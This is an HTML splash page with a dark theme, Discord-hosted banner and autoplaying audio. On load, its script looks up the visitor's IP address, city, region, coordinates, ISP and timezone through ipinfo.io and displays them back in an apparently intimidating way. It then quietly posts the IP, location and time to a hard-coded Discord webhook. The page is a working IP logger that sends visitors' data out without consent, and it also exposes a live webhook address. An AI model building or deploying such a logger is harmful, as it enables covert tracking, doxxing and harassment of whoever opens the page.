<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PSYCHO & CJ</title>
<style>
    body {
        margin: 0;
        padding: 0;
        font-family: 'Courier New', Courier, monospace;
        color: #490a0a;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
        text-align: center;
        overflow: hidden;
        background-color: black;
    }
    .background-video {
        display: none;
    }
    .content {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 1;
        position: relative;
        height: 100vh;
        width: 100%;
    }
    .background-video-second {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        z-index: -1;
    }
    .info {
        margin-top: 20px;
        font-size: 1.5em;
        background: linear-gradient(45deg, white, silver, gold);
        -webkit-background-clip: text;
        color: transparent;
        text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.5), 0px 0px 15px rgba(255, 255, 255, 0.5), 0px 0px 25px rgba(255, 255, 255, 0.5);
        letter-spacing: 4.5px;
        white-space: pre-wrap;
    }
    .text {
        margin-top: 20px;
        font-size: 3em;
        background: linear-gradient(45deg, white, silver, gold);
        -webkit-background-clip: text;
        color: transparent;
        text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.5), 0px 0px 15px rgba(255, 255, 255, 0.5), 0px 0px 25px rgba(255, 255, 255, 0.5);
        letter-spacing: 4.5px;
    }
    .marquee {
        position: absolute;
        top: 10%;
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
    }
    .marquee span {
        display: inline-block;
        font-size: 2em;
        color: #ff0000;
        text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000;
        animation: scroll 10s linear infinite;
    }
    @keyframes scroll {
        0% { transform: translateX(100%); }
        100% { transform: translateX(-100%); }
    }
    .image-container img {
        max-width: 80%;
        height: auto;
        margin: 20px auto;
        display: block;
        filter: drop-shadow(0 0 0 white) drop-shadow(0 0 2px white) drop-shadow(0 0 4px white);
    }
</style>
</head>
<body>

<div class="content">
    <video class="background-video-second" autoplay loop muted>
        <source src="" type="video/mp4">
        Your browser does not support the video tag.
    </video>
    <div class="marquee">
        <span></span>
    </div>
    <div id="content">
        <div class="image-container">
            <img src="https://images-ext-1.discordapp.net/external/HeaLkTrNqV0jPXIWtxPllG_7fv9J7Rl0wBvDqZlJOlc/%3Fsize%3D1024%26width%3D2048%26height%3D0/https/cdn.discordapp.com/banners/619571499489165323/a_78ba8f23d60b95e67e1b3c855d54525b.gif" alt="">
        </div>
        <div class="info" id="ip-info">Loading IP Info...</div>
        <div class="text">RAMBO NUMBER.ابلععع/1 RAMBO 3naTyFamily</div>
        <audio autoplay loop>
            <source src="https://cdn.discordapp.com/attachments/938536293388931153/1360737109610201259/Untitled_video_-_Made_with_Clipchamp_9.mp4?ex=67fc34b0&is=67fae330&hm=4c142ae98700ef0fa3c5e223983a792af14b6ba5fce30715fcf88a3109702a7b&" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
    </div>
</div>
<script>
    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const { ip, country, city, region, loc, org, timezone } = data;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.innerHTML = `<strong>#Suwaidi Family</strong><br><strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
            const dateTime = new Date().toLocaleString();
            const webhookUrl = 'https://discord.com/api/webhooks/1342711596035604511/c2zeLZnSp0faGn2G7rnFX6NOdOt1ewLys7Sp55NJt1p1A6FIkFkDciidXSyaV7_3WGie';
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
                })
            });
        });
</script>
</body>
</html>
